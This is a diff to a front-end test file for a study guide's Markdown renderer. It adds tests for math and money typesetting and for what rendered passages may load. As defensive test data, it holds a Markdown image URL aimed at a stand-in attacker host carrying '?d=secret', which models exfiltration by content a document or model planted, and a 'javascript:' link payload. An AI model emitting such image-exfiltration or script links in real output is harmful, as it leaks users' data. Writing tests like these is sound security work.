@@ -2,13 +2,18 @@
 /**
  * A prose passage through the real Markdown renderer: a paragraph that is a
  * fenced code block or a list is drawn as that block, and its sources still
- * show. The other reader suites stand the renderer in; this one does not.
+ * show; math and money; and nothing a model wrote can fetch a URL by itself.
+ * The other reader suites stand the renderer in; this one does not.
  */
 import { afterEach, describe, expect, it, vi } from "vitest";
 import { cleanup, render, screen, within } from "@testing-library/react";
 
-// The renderer itself, without the lazy wrapper the page loads it through.
-vi.mock("./Markdown", async () => ({ Markdown: (await import("@/components/chat/MarkdownChat")).MarkdownChat }));
+// The page loads the renderer lazily. Here the reader's own wrapper gets the
+// real one, already loaded.
+vi.mock("next/dynamic", async () => {
+  const { MarkdownChat } = await import("@/components/chat/MarkdownChat");
+  return { default: () => MarkdownChat };
+});
 
 import type { Paragraph, ProseItem } from "@/lib/studyGuide/types";
 
@@ -104,5 +109,53 @@ describe("a prose passage", () => {
     renderProse([{ text: CODE, citations: [] }], "skim");
     expect(screen.getByTestId("guide-skim-p1")).toHaveTextContent("Loops repeat.");
     expect(screen.queryByTestId("guide-prose-p1")).not.toBeInTheDocument();
+  });
+});
+
+describe("math and money in a passage", () => {
+  it("typesets inline math", async () => {
+    renderProse([{ text: "Demand is elastic when $E_d = 1.5$ or more.", citations: [] }]);
+    const prose = screen.getByTestId("guide-prose-p1");
+    await within(prose).findByText(/Demand is elastic when/);
+    expect(prose.querySelectorAll(".katex")).toHaveLength(1);
+    expect(prose).not.toHaveTextContent("$");
+  });
+
+  it("shows a money amount written with a backslash as money, beside real math", async () => {
+    // What the section writer is told to write. Two bare dollar signs in one
+    // paragraph would be read as the two ends of a formula.
+    renderProse([{ text: "A firm raises its price from \\$4 to \\$5, so $E_d = 1.5$.", citations: [] }]);
+    const prose = screen.getByTestId("guide-prose-p1");
+    await within(prose).findByText(/A firm raises its price from \$4 to \$5, so/);
+    expect(prose.querySelectorAll(".katex")).toHaveLength(1);
+  });
+});
+
+describe("what a passage may load", () => {
+  it("draws no image, so opening a guide never fetches a URL a document planted", async () => {
+    renderProse([{ text: "Before ![chart](https://evil.example/x.png?d=secret) after.", citations: [] }]);
+    const prose = screen.getByTestId("guide-prose-p1");
+    await within(prose).findByText(/Before/);
+    expect(prose.querySelector("img")).toBeNull();
+    expect(prose).toHaveTextContent("Before after.");
+  });
+
+  it("draws no embedded frame", async () => {
+    renderProse([
+      { text: "An embed:", citations: [] },
+      { text: "::geogebra{id=abc123}", citations: [] },
+    ]);
+    const prose = screen.getByTestId("guide-prose-p1");
+    await within(prose).findByText("An embed:");
+    expect(prose.querySelector("iframe")).toBeNull();
+  });
+
+  it("opens a link in a new tab without a referrer, and drops a script link's target", async () => {
+    renderProse([{ text: "See [the notes](https://example.com/notes) or [this](javascript:alert(1)).", citations: [] }]);
+    const link = await screen.findByRole("link", { name: "the notes" });
+    expect(link).toHaveAttribute("href", "https://example.com/notes");
+    expect(link).toHaveAttribute("target", "_blank");
+    expect(link).toHaveAttribute("rel", "noreferrer");
+    expect(screen.getByText("this")).not.toHaveAttribute("href", expect.stringContaining("javascript"));
   });
 });
